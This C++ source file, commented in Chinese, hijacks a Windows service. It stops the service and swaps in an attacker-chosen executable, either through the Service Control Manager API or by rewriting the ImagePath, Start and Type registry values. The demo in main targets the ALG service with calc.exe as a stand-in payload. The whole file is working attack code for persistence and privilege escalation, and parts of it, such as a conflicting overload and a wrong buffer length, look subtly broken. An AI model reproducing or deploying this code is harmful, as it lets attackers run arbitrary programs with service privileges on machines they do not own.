// HijackService.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <tchar.h>
#include <Windows.h>

BOOL HijackService(TCHAR *pServiceName, TCHAR *pFilePath, BOOL bStart)
{
	//获得服务管理器SCM的句柄
	SC_HANDLE hSCM = OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
	if (hSCM == NULL)
	{
		return FALSE;
	}
	SC_HANDLE hService = NULL;
	//获得具有指定权限的服务句柄
	hService=OpenService(hSCM, pServiceName,
		SERVICE_QUERY_CONFIG|SERVICE_CHANGE_CONFIG|SERVICE_STOP|SERVICE_START); 
	if (hService == 0)
	{
		CloseServiceHandle(hSCM);
		return FALSE;
	}
	//第一次调用来得到查询时需要多大的内存区
	LPQUERY_SERVICE_CONFIG lpServiceInfo = NULL;
	DWORD dwSize = 0;
	BOOL bRet = QueryServiceConfig(hService,lpServiceInfo,dwSize,&dwSize); 
	if (!bRet && dwSize==0)
	{
		CloseServiceHandle(hSCM);
		CloseServiceHandle(hService); 
		return FALSE;
	}
	lpServiceInfo=(LPQUERY_SERVICE_CONFIG)LocalAlloc(LPTR,dwSize);
	if (lpServiceInfo == NULL)
	{
		CloseServiceHandle(hSCM);
		CloseServiceHandle(hService); 
		return FALSE;
	}
	//第而次调用查询指定服务的信息
	bRet = QueryServiceConfig(hService,lpServiceInfo,dwSize,&dwSize);	
	if (!bRet && dwSize==0)
	{
		CloseServiceHandle(hSCM);
		CloseServiceHandle(hService); 
		LocalFree(lpServiceInfo);
		return FALSE;
	} 
    SERVICE_STATUS status; 
	//首先停止服务。
    bRet = ControlService(hService, SERVICE_CONTROL_STOP, &status);
	if (!bRet)
	{
		if (GetLastError() != ERROR_SERVICE_NOT_ACTIVE)
		{
			CloseServiceHandle(hSCM);
			CloseServiceHandle(hService); 
			LocalFree(lpServiceInfo);
			return FALSE;
		}
	}
	//修改服务关联的程序
	bRet = ChangeServiceConfig(hService,SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START,
		lpServiceInfo->dwErrorControl, pFilePath, lpServiceInfo->lpLoadOrderGroup,
		NULL, lpServiceInfo->lpDependencies,
		lpServiceInfo->lpServiceStartName, NULL, lpServiceInfo->lpDisplayName);
	if (bRet && bStart)
	{	//启动服务
		bRet = StartService(hService, 0, NULL);
	}
	CloseServiceHandle(hSCM);
	CloseServiceHandle(hService); 
	LocalFree(lpServiceInfo);
	return bRet;
}


BOOL HijackService(TCHAR *pServiceName, TCHAR *pFilePath)
{
	HKEY 	hBhoMainKey = HKEY_LOCAL_MACHINE;
	HKEY 	hClsidMainKey = HKEY_CLASSES_ROOT;
	HKEY 	hSubKey;
	//打开HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services键句柄，并获设置值权限。
	TCHAR   tcBuffer[128] = {0};
	_stprintf(tcBuffer, "System\\CurrentControlSet\\Services\\%s", pServiceName);
	LONG ReturnValue = RegOpenKeyEx (HKEY_LOCAL_MACHINE, tcBuffer,0L, KEY_SET_VALUE, &hSubKey);
	if (ReturnValue == ERROR_SUCCESS) //如果成功打开
	{		//设置服务关联的程序
		ReturnValue = RegSetValueEx(hSubKey, _T("ImagePath"), 0, REG_EXPAND_SZ, 
			(BYTE *)pFilePath, _tcslen(pFilePath));
		if(ReturnValue != ERROR_SUCCESS)
		{
			RegCloseKey(hSubKey);
			return FALSE;
		}
		DWORD dwStart = 3; //设置服务为手动启动
		ReturnValue = RegSetValueEx(hSubKey, _T("Start"), 0, REG_DWORD, 
			(BYTE *)&dwStart, sizeof(dwStart));
		if(ReturnValue != ERROR_SUCCESS)
		{
			RegCloseKey(hSubKey);
			return FALSE;
		}
		DWORD dwType = 16; //设置服务类型是用户层服务
		ReturnValue = RegSetValueEx(hSubKey, _T("Type"), 0, REG_DWORD, 
			(BYTE *)&dwType, sizeof(dwType));
		if(ReturnValue != ERROR_SUCCESS)
		{
			RegCloseKey(hSubKey);
			return FALSE;
		}
	}
	return TRUE;
}

int main(int argc, char* argv[])
{
	if(HijackService("ALG", "C:\\WINDOWS\\system32\\calc.exe",1))
	{
		printf("ok");
	}
	return 0;
}

